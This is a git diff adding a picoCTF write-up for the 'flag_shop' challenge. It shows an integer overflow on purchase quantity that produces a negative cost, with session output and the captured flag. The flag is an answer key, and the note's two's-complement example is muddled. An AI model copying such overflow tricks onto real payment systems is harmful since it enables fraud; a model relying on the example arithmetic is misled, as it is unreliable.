@@ -1,6 +1,6 @@
 <h1 align="center"> :computer: GENERAL SKILLS :computer:</h1>
 
-<p align="center">:pirate_flag: Flags Captured: 45 / 51 :pirate_flag:</p>
+<p align="center">:pirate_flag: Flags Captured: 46 / 51 :pirate_flag:</p>
 
 
 |     |     |     |
@@ -13,7 +13,7 @@
 | [2 Warm](#2warm) :pirate_flag:| [Time Machine](#time-machine) :pirate_flag:| [dont-you-love-banners](#dont-you-love-banners)|
 | [Bases](#bases) :pirate_flag: | [Commitment Issues](#commitment-issues):pirate_flag:| [SansAlpha](#sansalpha)|
 | [Wave a flag](#wave-a-flag) :pirate_flag:| [Collaborative Development](#collaborative-developement) :pirate_flag:|[Permissions](#permissions)|
-| [Tab, Tab, Attack](#tab-tab-attack) :pirate_flag:| [Blame Game](#blame-game) :pirate_flag:| [flag_shop](#flag_shop)|
+| [Tab, Tab, Attack](#tab-tab-attack) :pirate_flag:| [Blame Game](#blame-game) :pirate_flag:| [flag_shop](#flag_shop) :pirate_flag:|
 | [First grep](#first-grep) :pirate_flag:| [First Find](#first-find) :pirate_flag:| [Music](#music)|
 | [strings it](#strings-it) :pirate_flag:| [Big Zip](#big-zip) :pirate_flag:| [1_wanna_b3_a_r0ck5tar](#1_wanna_b3_a_r0ck5tar)|
 | [Python Wragling](#python-wrangling) :pirate_flag:| [Glitch Cat](#glitch-cat) :pirate_flag:|
@@ -1950,7 +1950,7 @@ Authors
 There *is* a manual for this thing! And it contains the flag at the bottom of the page. 
 
 
-[!RTFM.gif](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWpzcXc2bWlwNTA0ems5Z2s4dXI3eDllZ2RrdmMzdmVjcXM4cnljZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3NXbecukTskoSGZngb/giphy.gif)
+![RTFM.gif](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWpzcXc2bWlwNTA0ems5Z2s4dXI3eDllZ2RrdmMzdmVjcXM4cnljZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3NXbecukTskoSGZngb/giphy.gif)
 
 
 >[!NOTE]
@@ -2712,11 +2712,79 @@ what is the password?
 > There's a flag shop selling stuff, can you buy a flag? <a href="https://jupiter.challenges.picoctf.org/static/dd28f0987f28c894f35d5d48564c3402/store.c">Source</a>. 
 > Connect with nc jupiter.challenges.picoctf.org 44566.
 
+> **HINT:** Two's compliment can do some weird things when numbers get really big!
+
 ### Solution 
+
+We netcat in and find a cute little flag shop. I started by checking my balance. 
+
+```
+nc jupiter.challenges.picoctf.org 44566
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+1
+
+
+
+ Balance: 1100 
+
+```
+
+We can buy 'not the flag' flags for 900 each, or the real flag for 100,000. Since we don't have 100,000 we're going to have to use a large number (per the hint) to **overflow* the 2s complement binary number.  I tried to buy 1 million dummy flags but this number was not high enough. 
+
+> [!NOTE]
+> Overflow in 2s complement
+> Overflow can happen when the result of adding or subtracting two signed binary numbers exceeds the number of bits needed to represent that number. 
+> For instance, if I'm subtracting numbers and get should get -20, but I only have four signed bits, I'm going to run into an overflow error. 
+> -20<sub>10<sub> equals 10110<sub>2<sub> in twos complement. However, there are two many bits here. When this happens the MSB gets dropped and we're left with 0110<sub>2<sub> or positive 12. We we're expecting a negative number, but got a positive one instead. 
+> The same principle applies to this challenge, just with much larger numbers. 
+
+
+```
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+1
+These knockoff Flags cost 900 each, enter desired quantity
+1000000
+
+The final cost is: 900000000
+Not enough funds to complete purchase
+```
+
+Let's try to buy even more flags. How about 900 million flags? 
+
+```
+These knockoff Flags cost 900 each, enter desired quantity
+900000000
+
+The final cost is: -1748818944
+
+Your current balance after transaction: 1748820044
+```
+Nice. It looks like we successfully exploited 2's complement and we're able to actually buy the 900 million dummy flags for a **negative** amount! This gives us a balance of 1,748,820,044 which is more than enough to buy the '1337 flag' for 100k. 
+
+```
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+2
+1337 flags cost 100000 dollars, and we only have 1 in stock
+Enter 1 to buy one1
+YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
+```
 
 
 ### Flag
-:pirate_flag:``:pirate_flag:
+:pirate_flag:`picoCTF{m0n3y_bag5_68d16363}`:pirate_flag:
 
 ---
 
